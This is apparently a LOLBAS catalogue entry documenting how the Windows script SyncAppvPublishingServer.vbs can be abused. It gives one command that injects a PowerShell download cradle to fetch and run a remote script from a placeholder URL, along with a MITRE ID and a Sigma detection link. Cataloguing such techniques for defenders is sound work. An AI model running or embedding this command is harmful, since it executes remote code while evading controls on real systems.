---
Name: Syncappvpublishingserver.vbs
Description: Script used related to app-v and publishing server
Author: 'Oddvar Moe'
Created: 2018-05-25
Commands:
  - Command: SyncAppvPublishingServer.vbs "n;((New-Object Net.WebClient).DownloadString('http://some.url/script.ps1') | IEX"
    Description: Inject PowerShell script code with the provided arguments
    Usecase: Use Powershell host invoked from vbs script
    Category: Execute
    Privileges: User
    MitreID: T1216
    OperatingSystem: Windows 10
Full_Path:
  - Path: C:\Windows\System32\SyncAppvPublishingServer.vbs
Code_Sample:
  - Code:
Detection:
  - Sigma: https://github.com/SigmaHQ/sigma/blob/973e0666acffb8fd7ea8356449eb916381ab0cc6/rules/windows/process_creation/process_creation_syncappvpublishingserver_vbs_execute_powershell.yml
Resources:
  - Link: https://twitter.com/monoxgas/status/895045566090010624
  - Link: https://twitter.com/subTee/status/855738126882316288
Acknowledgement:
  - Person: Nick Landers
    Handle: '@monoxgas'
  - Person: Casey Smith
    Handle: '@subtee'
---
